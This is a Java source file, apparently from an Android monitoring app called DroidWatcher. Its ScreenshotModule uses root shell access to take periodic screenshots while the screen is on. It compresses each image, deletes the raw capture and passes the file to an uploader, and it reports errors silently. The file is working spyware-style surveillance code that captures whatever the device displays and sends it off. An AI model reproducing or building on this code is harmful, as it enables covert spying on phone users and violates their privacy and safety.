package com.droidwatcher.modules;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.lang.ref.WeakReference;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

import org.acra.ACRA;

import com.droidwatcher.Debug;
import com.droidwatcher.FileSender;
import com.droidwatcher.SettingsManager;
import com.droidwatcher.FileSender.FileType;
import com.droidwatcher.lib.FileUtil;
import com.droidwatcher.lib.ImageUtil;
import com.droidwatcher.receivers.ScreenStateReceiver;
import com.stericson.RootTools.RootTools;
import com.stericson.RootTools.execution.CommandCapture;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Bitmap;
import android.os.Handler;
import android.os.Message;
import android.support.v4.content.LocalBroadcastManager;

public class ScreenshotModule {
	private static final String SCREENCAP_PATH = "/system/bin/screencap";
	private static final Locale sLocale = new Locale("ru","RU");
	private static final long FIRST_SCREENSHOT_DELAY = 3 * 1000L;
	//private Boolean isScreenOff = true;
	
	private Context mContext;
	private SettingsManager mSettings;
	private Handler mHandler;
	private BroadcastReceiver mScreenStateReceiver;
	
	public static final String PREFIX = "[screenshot]";
	
	public static Boolean isAvailable(){
		if (android.os.Build.VERSION.SDK_INT < 14) {
			return false;
		}
		
		return new File(SCREENCAP_PATH).exists();
	}
	
	public ScreenshotModule(Context context){
		this.mContext = context;
		mSettings = new SettingsManager(context);
		
		mScreenStateReceiver = new BroadcastReceiver() {
			@Override
			public void onReceive(Context context, Intent intent) {
				//isScreenOff = intent.getAction().equals(Intent.ACTION_SCREEN_OFF);
				int state = intent.getIntExtra(ScreenStateReceiver.SCREEN_STATE_EXTRA, ScreenStateReceiver.SCREEN_STATE_UNKNOWN);
				
				switch (state) {
				case ScreenStateReceiver.SCREEN_STATE_OFF:
					mHandler.removeMessages(0);
					break;
				case ScreenStateReceiver.SCREEN_STATE_ON:
					if(mSettings.isScreenshotEnabled()){
						mHandler.sendEmptyMessageDelayed(0, FIRST_SCREENSHOT_DELAY);
					}
					break;
				default:
					break;
				}
			}
		};
		
		mHandler = new MyHandler(this);
	}
	
	private void makeScreenshot(){
		if (FileUtil.isExternalStorageAvailable() && FileUtil.hasExternalStorageFreeMemory()){			
			if (RootTools.isAccessGiven()){
				try {
					String path = FileUtil.getExternalFullPath(mContext, "screenshot.jpg");
					MakeScreenshotCommand command = new MakeScreenshotCommand(path);
					RootTools.getShell(true).add(command);
					
				} catch (Exception e) {
					ACRA.getErrorReporter().handleSilentException(e);
				}
			}
		}
		
		if(mSettings.isScreenshotEnabled()){
			mHandler.sendEmptyMessageDelayed(0, mSettings.screenshotInterval());
		}
	}
	
	public void start(){
		LocalBroadcastManager.getInstance(mContext).registerReceiver(
			mScreenStateReceiver,
			new IntentFilter(ScreenStateReceiver.SCREEN_EVENT)
		);
	}
	
	public void dispose(){
		try {
			LocalBroadcastManager.getInstance(mContext).unregisterReceiver(mScreenStateReceiver);
			mHandler.removeMessages(0);
			mHandler = null;
			mScreenStateReceiver = null;
			
			
		} catch (Exception e) {
			Debug.exception(e);
		}
	}
	
	private class MakeScreenshotCommand extends CommandCapture{
		private static final String CMD = "/system/bin/screencap -p ";
		
		private String path;
		
		public MakeScreenshotCommand(String path){
			super(0, CMD + path);
			
			this.path = path;
		}
		
		@Override
		public void commandCompleted(int id, int exitcode) {
			Bitmap bmp = null;
			FileOutputStream out = null;
			try {
				int size = mSettings.screenshotSize();
				bmp = ImageUtil.getResizedImage(path, size);
				if (bmp != null) {
					Date dt = new Date();
					String date = SimpleDateFormat.getDateTimeInstance(SimpleDateFormat.SHORT, SimpleDateFormat.MEDIUM, sLocale).format(dt);
					date = date.replace(':', '-');//.replace(' ', '_');
					String fName = PREFIX + "[" + date + "]" + "[" + dt.getTime() + "]" + ".jpg";
					out = new FileOutputStream(FileUtil.getExternalFullPath(mContext, fName));
				    bmp.compress(Bitmap.CompressFormat.JPEG, 60, out);
				    
				    File del = new File(path);
				    del.delete();
				    
				    new FileSender(mContext, FileType.SCREENSHOT).start();
				    
				}
			} catch (Exception e) {
				ACRA.getErrorReporter().handleSilentException(e);
				
			} finally {
				if (bmp != null && !bmp.isRecycled()) {
					bmp.recycle();
					bmp = null;
				}
				if (out != null) {
					try {
						out.close();
						
					} catch (IOException e) {
						Debug.exception(e);
					}
					out = null;
				}
			}
		}
		
		@Override
		public void commandTerminated(int id, String reason) {
			super.commandTerminated(id, reason);
			ACRA.getErrorReporter().handleSilentException(new Exception(reason));
		}
	}
	
	private static class MyHandler extends Handler{
		private final WeakReference<ScreenshotModule> mModule;
		
		private MyHandler(ScreenshotModule module) {
			mModule = new WeakReference<ScreenshotModule>(module);
	    }
		
		@Override
        public void handleMessage(Message msg) {
			ScreenshotModule mgr = mModule.get();
	         if (mgr != null && msg.what == 0) {
	              mgr.makeScreenshot();
	         }
		}
	}
}
